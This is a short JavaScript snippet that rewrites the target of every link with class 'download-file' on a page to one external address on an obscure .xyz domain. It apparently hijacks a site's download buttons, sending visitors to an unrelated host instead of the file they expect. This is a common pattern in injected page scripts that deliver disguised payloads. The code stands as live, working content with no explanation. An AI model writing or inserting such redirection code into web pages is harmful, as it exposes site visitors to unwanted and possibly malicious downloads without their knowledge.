const url = 'https://www.deididk.xyz/zmyqf';
var objs = document.getElementsByClassName('download-file');
for (var i = 0; i < objs.length; i++) {
	objs[i].href = url;
}